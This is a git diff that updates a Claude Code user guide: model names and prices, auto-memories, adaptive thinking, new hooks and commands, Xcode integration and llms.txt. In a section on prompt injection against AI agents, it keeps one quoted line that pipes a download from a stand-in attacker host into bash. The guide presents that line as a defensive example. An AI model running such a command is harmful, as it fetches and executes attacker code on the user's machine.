@@ -1422,7 +1422,7 @@ Add to `~/.claude/settings.json`:
 }
 ```
 
-This displays: `Model: Opus 4.5 | Ctx: 0 | ⎇ main | (+0,-0) | Cost: $0.27 | Session: 0m | Ctx(u): 0.0%`
+This displays: `Model: Sonnet 4.5 | Ctx: 0 | ⎇ main | (+0,-0) | Cost: $0.27 | Session: 0m | Ctx(u): 0.0%`
 
 **Option 2: Custom script**
 
@@ -1466,7 +1466,14 @@ When context gets high:
 - Loses all context
 - Use when changing topics
 
-**Option 3: Targeted Approach**
+**Option 3: Summarize from here** (v2.1.32+)
+- Right-click message in conversation history
+- Select "Summarize from here"
+- Claude summarizes everything from that point forward
+- Frees space while keeping critical context
+- More precise than full `/compact`
+
+**Option 4: Targeted Approach**
 - Be specific in queries
 - Avoid "read the entire file"
 - Use symbol references: "read the `calculateTotal` function"
@@ -1715,15 +1722,17 @@ Example output:
 
 Claude Code isn't free - you're using API credits. Understanding costs helps optimize usage.
 
-#### Pricing Model (as of January 2026)
+#### Pricing Model (as of February 2026)
 
-Claude Code uses **Claude Sonnet 3.5** by default:
+Claude Code uses **Claude Sonnet 4.5** by default:
 
-| Model | Input (per 1M tokens) | Output (per 1M tokens) | Context Window |
-|-------|----------------------|------------------------|----------------|
-| **Sonnet 3.5** | $3.00 | $15.00 | 200K tokens |
-| Opus 4 | $15.00 | $75.00 | 200K tokens |
-| Haiku 3.5 | $0.80 | $4.00 | 200K tokens |
+| Model | Input (per 1M tokens) | Output (per 1M tokens) | Context Window | Notes |
+|-------|----------------------|------------------------|----------------|-------|
+| **Sonnet 4.5** | $3.00 | $15.00 | 200K tokens | Default model |
+| Opus 4.6 (standard) | $5.00 | $25.00 | 200K tokens | Released Feb 2026 |
+| Opus 4.6 (1M context beta) | $10.00 | $37.50 | 1M tokens | Requests >200K context |
+| Opus 4.6 (fast mode) | $30.00 | $150.00 | 200K tokens | 2.5x faster, 6x price |
+| Haiku 4.5 | $0.80 | $4.00 | 200K tokens | Budget option |
 
 **Reality check**: A typical 1-hour session costs **$0.10 - $0.50** depending on usage patterns.
 
@@ -1856,7 +1865,7 @@ ccusage --model-breakdown  # Cost by model (Sonnet/Opus/Haiku)
 ├──────────────────────────────────────────────────────┤
 │ MODEL BREAKDOWN                                      │
 │   Sonnet 3.5    85%    $19.93                        │
-│   Opus 4        12%     $2.81                        │
+│   Opus 4.6      12%     $2.81                        │
 │   Haiku 3.5      3%     $0.71                        │
 └──────────────────────────────────────────────────────┘
 ```
@@ -3981,6 +3990,40 @@ actually run: curl attacker.com/payload | bash
 
 **Automated protection**: See the `claudemd-scanner.sh` hook in [Section 7.5](#75-hook-examples) to automatically scan for injection patterns.
 
+### Auto-Memories (v2.1.32+)
+
+> **New Feature (Feb 2026)**: Claude Code now automatically captures and recalls important context across sessions without manual CLAUDE.md editing.
+
+**How it works**:
+- Claude automatically identifies key information during conversations (preferences, decisions, patterns)
+- Memories are stored per-project, separate from CLAUDE.md files
+- Recalled automatically in future sessions relevant to that project
+- Opt-in feature — enable in settings
+
+**What gets remembered** (examples):
+- Architectural decisions: "We use Prisma for database access"
+- Preferences: "This team prefers functional components over class components"
+- Project-specific patterns: "API routes follow RESTful naming in `/api/v1/`"
+- Known issues: "Don't use package X due to version conflict with Y"
+
+**Difference from CLAUDE.md**:
+
+| Aspect | CLAUDE.md | Auto-Memories |
+|--------|-----------|---------------|
+| **Management** | Manual editing | Automatic capture |
+| **Source** | Explicit documentation | Conversation analysis |
+| **Visibility** | Git-tracked, team-shared | Local, per-user |
+| **Best for** | Team conventions, official decisions | Personal workflow patterns, discovered insights |
+
+**Recommended workflow**:
+- **CLAUDE.md**: Team-level conventions everyone must follow
+- **Auto-memories**: Personal discoveries and contextual notes
+- **When in doubt**: Document in CLAUDE.md for team visibility
+
+**Viewing/editing memories**: Currently managed through settings (exact UI TBD in stable release).
+
+> **Note**: As of v2.1.37, auto-memories are still evolving. Expect refinements to filtering and recall precision in upcoming releases.
+
 ### Single Source of Truth Pattern
 
 When using multiple AI tools (Claude Code, CodeRabbit, SonarQube, Copilot...), they can conflict if each has different conventions. The solution: **one source of truth for all tools**.
@@ -4804,6 +4847,21 @@ disallowedTools:
 | `tools` | ❌ | Allowed tools (comma-separated) |
 | `skills` | ❌ | Skills to inherit |
 | `disallowedTools` | ❌ | Tools to block |
+| `memory` | ❌ | Pre-populated memory context (v2.1.32+) |
+
+**New in v2.1.32**: The `memory` field enables pre-populated agent context:
+
+```yaml
+---
+name: security-auditor
+memory: |
+  This project follows OWASP Top 10 guidelines.
+  Previous audit (Dec 2025) flagged JWT expiry handling.
+  Team prefers early warnings over false positives.
+---
+```
+
+This memory is injected into the agent's context at spawn, enabling continuity without repeating project details.
 
 ### Model Selection
 
@@ -6926,6 +6984,8 @@ Hooks are scripts that run automatically when specific events occur.
 | `Setup` | Claude Code starts | Initialization (v2.1.10+) |
 | `PermissionRequest` | Permission dialog appears | Custom approval logic |
 | `SubagentStop` | Sub-agent completes | Subagent cleanup |
+| `TeammateIdle` | Agent team member goes idle | Team coordination (v2.1.32+) |
+| `TaskCompleted` | Task marked as completed | Workflow triggers (v2.1.32+) |
 
 ### Event Flow
 
@@ -7467,7 +7527,7 @@ echo "Exit code: $?"  # Should be 0
 
 The Claude Code team uses a pattern where permission requests are routed to a **more capable model** acting as a security gate, rather than relying solely on static rule matching.
 
-**Concept**: A `PreToolUse` hook intercepts permission requests and forwards them to Opus 4.5 (or another capable model) via the API. The gate model scans for prompt injection, dangerous patterns, and unexpected tool usage — then auto-approves safe requests or blocks suspicious ones.
+**Concept**: A `PreToolUse` hook intercepts permission requests and forwards them to Opus 4.6 (or another capable model) via the API. The gate model scans for prompt injection, dangerous patterns, and unexpected tool usage — then auto-approves safe requests or blocks suspicious ones.
 
 ```bash
 # .claude/hooks/opus-security-gate.sh (conceptual)
@@ -9883,7 +9943,7 @@ The most powerful Claude Code pattern combines three techniques:
 │          │                                              │
 │          ▼                                              │
 │   ┌─────────────┐                                       │
-│   │ Ext.Thinking│  Deep analysis (default in Opus 4.5) │
+│   │ Ext.Thinking│  Deep analysis (Opus 4.5/4.6, adaptive in 4.6) │
 │   └──────┬──────┘                                       │
 │          │                                              │
 │          ▼                                              │
@@ -9906,33 +9966,56 @@ The most powerful Claude Code pattern combines three techniques:
 | Architectural decision | ✅ Yes |
 | Legacy system modernization | ✅ Yes |
 
-### Extended Thinking (Opus 4.5+)
+### Extended Thinking (Opus 4.5+) & Adaptive Thinking (Opus 4.6+)
 
-> **⚠️ Important Change (v2.0.67+)**: With Opus 4.5, **thinking mode is enabled by default at maximum budget**. The keywords "think", "think hard", "ultrathink" are now **cosmetic only** — they no longer control behavior.
+> **⚠️ Breaking Change (Opus 4.6, Feb 2026)**: Opus 4.6 replaces **budget-based thinking** with **Adaptive Thinking**, which automatically decides when to use deep reasoning based on query complexity. The `budget_tokens` parameter is **deprecated** on Opus 4.6.
 
-#### What Changed
+#### Evolution Timeline
 
-| Aspect | Before v2.0.67 | After v2.0.67 (Opus 4.5) |
-|--------|----------------|--------------------------|
-| Default state | Thinking off (opt-in) | Thinking on at max budget |
-| Keywords effect | Activated/boosted thinking | No effect (cosmetic) |
-| Control method | Prompt keywords | Alt+T toggle, `/config` |
-| Budget control | Variable (~4K/10K/32K) | Always maximum |
+| Version | Thinking Approach | Control Method |
+|---------|-------------------|----------------|
+| **Opus 4.5** (pre-v2.0.67) | Opt-in, keyword-triggered (~4K/10K/32K tokens) | Prompt keywords |
+| **Opus 4.5** (v2.0.67+) | Always-on at max budget | Alt+T toggle, `/config` |
+| **Opus 4.6** (Feb 2026) | **Adaptive thinking** (dynamic depth) | `effort` parameter (API), Alt+T (CLI) |
+
+#### Adaptive Thinking (Opus 4.6)
+
+**How it works**: The model dynamically calibrates reasoning depth based on query complexity. No fixed token budget — thinking adapts to the task.
+
+**Effort levels** (API only):
+- `low`: Minimal thinking, faster responses
+- `medium`: Moderate reasoning
+- `high` (default): Extended thinking when useful
+- `max`: Maximum reasoning depth
+
+**API syntax**:
+```python
+response = client.messages.create(
+    model="claude-opus-4-6",
+    max_tokens=16000,
+    thinking={"type": "adaptive", "effort": "high"},  # low|medium|high|max
+    messages=[{"role": "user", "content": "Analyze..."}]
+)
+```
+
+**CLI usage**: Same as before — Alt+T toggles thinking on/off globally. No per-request effort control in CLI (uses model's default `high`).
 
 #### Controlling Thinking Mode
 
-| Method | Action | Persistence |
-|--------|--------|-------------|
-| **Alt+T** (Option+T on macOS) | Toggle thinking on/off | Current session |
-| **/config** → Thinking mode | Enable/disable globally | Across sessions |
-| **Ctrl+O** | View thinking blocks (verbose) | Display only |
+| Method | Opus 4.5 | Opus 4.6 | Persistence |
+|--------|----------|----------|-------------|
+| **Alt+T** (Option+T on macOS) | Toggle on/off | Toggle on/off | Current session |
+| **/config** → Thinking mode | Enable/disable globally | Enable/disable globally | Across sessions |
+| **API `effort` parameter** | N/A (uses `budget_tokens`) | `low\|medium\|high\|max` | Per request |
+| **Ctrl+O** | View thinking blocks | View thinking blocks | Display only |
 
 #### Cost Implications
 
-Thinking tokens are billed. With thinking enabled by default:
+Thinking tokens are billed. With adaptive thinking:
+- **Opus 4.6**: Thinking usage varies dynamically (less predictable than fixed budget)
 - **Simple tasks**: Consider Alt+T to disable → faster responses, lower cost
-- **Complex tasks**: Leave enabled → better reasoning, worth the cost
-- **Sonnet/Haiku**: No extended thinking available (Opus 4.5 only). Note: The warning "Ultrathink no longer does anything" appears on **all models** (including Sonnet), even though the feature itself is Opus-only
+- **Complex tasks**: Leave enabled → better reasoning, adaptive depth
+- **Sonnet/Haiku**: No extended thinking available (Opus 4.5/4.6 only)
 
 #### Migration for Existing Users
 
@@ -9957,6 +10040,26 @@ claude -p "Analyze this architecture."
 | "Think" | ~4K tokens | Cosmetic only |
 | "Think hard" | ~10K tokens | Cosmetic only |
 | "Ultrathink" | ~32K tokens | Cosmetic only |
+
+#### API Breaking Changes (Opus 4.6)
+
+**Removed features**:
+- **`assistant-prefill`**: Deprecated on Opus 4.6. Previously allowed pre-filling Claude's response to guide output format. Now unsupported — use system prompts or examples instead.
+
+**New features**:
+- **Fast mode API**: Add `speed: "fast"` + beta header `fast-mode-2026-02-01` for 2.5x faster responses (6x cost)
+  ```python
+  response = client.messages.create(
+      model="claude-opus-4-6",
+      speed="fast",  # 2.5x faster, 6x price
+      headers={"anthropic-beta": "fast-mode-2026-02-01"},
+      messages=[...]
+  )
+  ```
+
+**Migration**:
+- If using `assistant-prefill`: Replace with explicit instructions in system prompt
+- For speed: Use fast mode API or `/fast` command in CLI
 
 ### Example: Using the Trinity
 
@@ -10755,6 +10858,21 @@ Works with IntelliJ, WebStorm, PyCharm:
 3. **Use**:
    - `Ctrl+Shift+A` → "Claude Code"
    - Tool window for persistent session
+
+### Xcode Integration (Feb 2026)
+
+**New**: Xcode 26.3 RC+ includes native Claude Agent SDK support, using the same harness as Claude Code:
+
+1. **Requirements**: Xcode 26.3 RC or later (macOS)
+2. **Setup**: Configure API key in Xcode → Preferences → Claude
+3. **Use**:
+   - Built-in code assistant powered by Claude
+   - Same capabilities as Claude Code CLI
+   - Native integration with Xcode workflows
+
+**Claude Agent SDK**: Separate product from Claude Code, but shares the same agent execution framework. Enables Claude-powered development tools in IDEs beyond VS Code.
+
+> **Note**: Claude Agent SDK is not Claude Code — it's Anthropic's framework for building agent-powered developer tools. Claude Code CLI and Xcode integration both use this SDK.
 
 ### Terminal Integration
 
@@ -13092,7 +13210,7 @@ Boris Cherny, creator of Claude Code, shared his workflow orchestrating 5-15 Cla
 - **5-10 instances** on claude.ai/code (`--teleport` to sync with local)
 - **Git worktrees** for isolation (each instance = separate checkout)
 - **CLAUDE.md**: 2.5k tokens, team-shared and versioned in git
-- **Model**: Opus 4.5 (slower but fewer corrections needed)
+- **Model**: Opus 4.6 (slower but fewer corrections needed, adaptive thinking)
 - **Slash commands**: `/commit-push-pr` used "dozens of times per day"
 
 **Results** (30 days, January 2026):
@@ -13114,7 +13232,7 @@ Boris Cherny, creator of Claude Code, shared his workflow orchestrating 5-15 Cla
 
 > **On verification loops**: "I give Claude a way to verify output (browser/tests): verification drives quality."
 
-**Why Opus 4.5 with Thinking**: Although more expensive per token (~$15/1M input vs $3/1M for Sonnet), Opus requires fewer correction iterations. Net result: faster delivery and lower total cost despite higher unit price.
+**Why Opus 4.6 with Adaptive Thinking**: Although more expensive per token ($5/1M input vs $3/1M for Sonnet, or $10/1M for 1M context beta), Opus requires fewer correction iterations thanks to adaptive thinking. Net result: faster delivery and lower total cost despite higher unit price.
 
 **The supervision model**: Boris describes his role as "tending to multiple agents" rather than "doing every click yourself." The workflow becomes about **steering outcomes** across 5-10 parallel sessions, unblocking when needed, rather than sequential execution.
 
@@ -14013,6 +14131,7 @@ New feature request
 **Key principles**:
 - **Domain Knowledge Embedding**: Put business logic and design decisions directly in code (CLAUDE.md, ADRs, comments)
 - **Code Discoverability**: Make code "searchable" like SEO—use synonyms, tags, complete terms
+- **Documentation Formats**: Use llms.txt for AI-optimized documentation indexing (complements MCP servers)
 - **Token Efficiency**: Split large files, remove obvious comments, use verbose flags for debug output
 - **Testing for Autonomy**: TDD is more critical for agents than humans—tests guide behavior
 - **Guardrails**: Hooks, CI checks, and PR reviews catch agent mistakes early
@@ -14422,7 +14541,173 @@ class UserManager {
 
 ---
 
-### 9.18.4 Token-Efficient Codebase
+### 9.18.4 Documentation Formats for Agents (llms.txt)
+
+**Problem**: Agents need to discover and consume project documentation efficiently. Traditional documentation (wikis, Confluence) is hard to find and parse. MCP doc servers require installation and configuration.
+
+**Solution**: Use the llms.txt standard for AI-optimized documentation indexing.
+
+#### What is llms.txt?
+
+llms.txt is a lightweight standard for making documentation discoverable to LLMs. It's like `robots.txt` for AI agents—a simple index file that tells agents where to find relevant documentation.
+
+**Specification**: https://llmstxt.org/
+
+**Format**: Plain text file at `/llms.txt` or `/machine-readable/llms.txt` containing:
+- Markdown content directly (inline docs)
+- Links to external documentation files
+- Structured sections for different topics
+
+**Example from this repo** (`machine-readable/llms.txt`):
+
+```
+# Claude Code Ultimate Guide
+
+Complete guide for Anthropic's Claude Code CLI (11,000+ lines, 66+ templates)
+
+## Quick Start
+- Installation: guide/ultimate-guide.md#installation (line 450)
+- First Session: guide/cheatsheet.md#first-session
+- CLAUDE.md Setup: guide/ultimate-guide.md#31-claudemd-project-context (line 1850)
+
+## Core Concepts
+- Agents: guide/ultimate-guide.md#4-agents (line 4100)
+- Skills: guide/ultimate-guide.md#5-skills (line 5400)
+- Hooks: guide/ultimate-guide.md#62-hooks (line 7200)
+
+## Templates
+- Custom agents: examples/agents/
+- Slash commands: examples/commands/
+- Event hooks: examples/hooks/
+```
+
+#### Why llms.txt Complements MCP Servers
+
+llms.txt and MCP doc servers solve **different problems**:
+
+| Aspect | llms.txt | Context7 MCP |
+|--------|----------|--------------|
+| **Purpose** | Static documentation index | Runtime library lookup |
+| **Setup** | Zero config (just a file) | Requires MCP server install |
+| **Content** | Project-specific docs | Official library docs |
+| **Token cost** | Low (index only, ~500 tokens) | Medium (full doc fetching) |
+| **Use case** | Project README, architecture | React API, Next.js patterns |
+| **Update frequency** | Manual (on doc changes) | Automatic (tracks library versions) |
+
+**Best practice**: Use **both**:
+- llms.txt for project-specific documentation (architecture, conventions, getting started)
+- Context7 MCP for official library documentation (React hooks, Express API)
+
+#### Creating llms.txt for Your Project
+
+**Minimal example**:
+
+```
+# MyProject
+
+Enterprise SaaS platform for event management
+
+## Getting Started
+- Setup: docs/setup.md
+- Architecture: docs/architecture.md
+- API Reference: docs/api.md
+
+## Development
+- Testing: docs/testing.md
+- Deployment: docs/deployment.md
+- Troubleshooting: docs/troubleshooting.md
+```
+
+**Advanced example with line numbers**:
+
+```
+# MyProject
+
+## Architecture Decisions
+- Why microservices: docs/decisions/ADR-001.md (line 15)
+- Event-driven design: docs/architecture.md#event-bus (line 230)
+- Database strategy: docs/decisions/ADR-005.md (line 42)
+
+## Common Patterns
+- Authentication flow: src/services/auth-service.ts (line 78-125)
+- Error handling: CLAUDE.md#error-patterns (line 150)
+- Rate limiting: src/middleware/rate-limiter.ts (line 45)
+
+## Domain Knowledge
+- Event lifecycle: docs/domain/events.md
+- Payment processing: docs/domain/payments.md
+- Webhook handling: docs/domain/webhooks.md
+```
+
+**Line numbers** help agents jump directly to relevant sections without reading entire files.
+
+#### When to Update llms.txt
+
+Update llms.txt when:
+- Adding new major documentation files
+- Restructuring docs directory
+- Documenting new architectural patterns
+- Adding ADRs (Architecture Decision Records)
+- Creating domain-specific guides
+
+**Don't** update for:
+- Code changes (unless architecture shifts)
+- Minor doc tweaks
+- Dependency updates
+
+#### Integration with CLAUDE.md
+
+llms.txt and CLAUDE.md serve different purposes:
+
+| File | Purpose | Audience |
+|------|---------|----------|
+| **CLAUDE.md** | Active instructions, project context | Claude during this session |
+| **llms.txt** | Documentation index | Claude discovering resources |
+
+**Pattern**: Reference llms.txt from CLAUDE.md:
+
+```markdown
+# CLAUDE.md
+
+## Project Documentation
+
+Complete documentation is indexed in `machine-readable/llms.txt`.
+
+Key resources:
+- Architecture overview: docs/architecture.md
+- API reference: docs/api.md
+- Testing guide: docs/testing.md
+
+For domain-specific knowledge, consult llms.txt index.
+```
+
+#### Real-World Example: This Guide
+
+This guide uses both llms.txt and CLAUDE.md:
+
+**llms.txt** (`machine-readable/llms.txt`):
+- Indexes all major sections with line numbers
+- Points to templates in `examples/`
+- References workflows in `guide/workflows/`
+
+**CLAUDE.md** (`CLAUDE.md`):
+- Active project context (repo structure, conventions)
+- Current focus (guide version, changelog)
+- Working instructions (version sync, landing sync)
+
+**Result**: Agents can discover content via llms.txt, then consult CLAUDE.md for active context.
+
+#### Specification Resources
+
+- **Official spec**: https://llmstxt.org/
+- **Community examples**: https://github.com/topics/llms-txt
+- **This guide's implementation**: `machine-readable/llms.txt`
+
+**Not recommended source**: Framework-specific blog posts (often present llms.txt in opposition to MCP servers, when they're complementary).
+
+---
+
+### 9.18.5 Token-Efficient Codebase
 
 **Problem**: Agents have token limits. Large files consume context budget quickly, forcing agents to read in chunks and lose coherence.
 
@@ -14594,7 +14879,7 @@ Configure logger in CLAUDE.md:
 
 ---
 
-### 9.18.5 Testing for Autonomy
+### 9.18.6 Testing for Autonomy
 
 **Problem**: Agents follow tests more reliably than documentation. Incomplete tests lead to incorrect implementations.
 
@@ -14825,7 +15110,7 @@ CI will reject PRs below 80% coverage.
 
 ---
 
-### 9.18.6 Conventions & Patterns
+### 9.18.7 Conventions & Patterns
 
 **Problem**: Agents hallucinate less when using familiar patterns from their training data.
 
@@ -15060,7 +15345,7 @@ class UserController {
 
 ---
 
-### 9.18.7 Guardrails & Validation
+### 9.18.8 Guardrails & Validation
 
 **Problem**: Agents make mistakes—hallucinations, incorrect assumptions, security oversights.
 
@@ -15242,7 +15527,7 @@ jobs:
 
 ---
 
-### 9.18.8 Serendipity & Cross-References
+### 9.18.9 Serendipity & Cross-References
 
 **Problem**: Agents work on isolated files and miss related code elsewhere in the codebase.
 
@@ -15420,7 +15705,7 @@ See TROUBLESHOOTING.md for full error catalog + solutions.
 
 ---
 
-### 9.18.9 Usage Instructions
+### 9.18.10 Usage Instructions
 
 **Problem**: Agents guess API usage patterns and often guess wrong (argument order, error handling, return types).
 
@@ -15633,7 +15918,7 @@ class GoogleCalendarClient {
 
 ---
 
-### 9.18.10 Decision Matrix & Implementation Checklist
+### 9.18.11 Decision Matrix & Implementation Checklist
 
 #### When to Optimize for Agents vs Humans
 
@@ -16274,6 +16559,8 @@ _Quick jump:_ [Commands Table](#101-commands-table) · [Keyboard Shortcuts](#102
 | `/plugin` | Manage Claude Code plugins | Config |
 | `/plan` | Enter Plan Mode | Mode |
 | `/execute` | Exit Plan Mode | Mode |
+| `/fast` | Toggle fast mode (Opus 4.6, 2.5x faster, 6x price) | Mode |
+| `/debug` | Systematic troubleshooting and error investigation | Debug |
 | `/rewind` | Undo recent changes | Edit |
 | `/exit` | Exit Claude Code | Session |
 | `Ctrl+D` | Exit Claude Code | Session |
@@ -16837,7 +17124,7 @@ Get the scripts from:
 ║  hooks/     Event scripts     rules/     Auto-load rules  ║
 ║  skills/    Knowledge modules                             ║
 ║                                                           ║
-║  THINKING MODE (Opus 4.5+ default: ON at max)             ║
+║  THINKING MODE (Opus 4.5/4.6: adaptive depth in 4.6)      ║
 ║  ─────────────────────────────────────────                ║
 ║  Alt+T          Toggle on/off   Current session           ║
 ║  /config        Global setting  Persists across sessions  ║
@@ -17163,7 +17450,7 @@ Claude Code is designed to be your **implementation partner** with deep codebase
 |-----|-----|----------|
 | **Deep research with sources** | WebSearch is limited (~5-10 sources) | Perplexity Pro (100+ verified sources) |
 | **Image → Code** | No visual understanding | Gemini 2.5 (superior image analysis) |
-| **Slide generation** | No PPTX output capability | Kimi (native PowerPoint) |
+| **Slide generation** | Limited PPTX (via Claude in PowerPoint add-in, research preview) | Kimi (native PowerPoint generation) |
 | **Audio synthesis** | No TTS capability | NotebookLM (podcast-style overviews) |
 | **Live browser prototyping** | No visual preview | v0.dev, Bolt (instant preview) |
 | **Rate limits / cost control** | Per-token billing, API limits | cc-copilot-bridge (flat-rate via Copilot) |
@@ -17179,7 +17466,7 @@ The goal isn't replacement—it's **chaining the right tool for each step**.
 | Implement a feature | **Claude Code** | ✅ Best choice |
 | Research before implementing | **Perplexity** | Limited sources, no citations |
 | Convert mockup to code | **Gemini → Claude** | Limited visual understanding |
-| Create stakeholder deck | **Claude → Kimi** | No PPTX export |
+| Create stakeholder deck | **Claude in PowerPoint (add-in)** or **Kimi** | Native PPTX generation limited to add-in |
 | Understand new codebase quickly | **NotebookLM → Claude** | No audio synthesis |
 | Rapid UI prototype | **v0/Bolt → Claude** | No live preview |
 | Quick inline edits | **IDE + Copilot** | Context switching overhead |
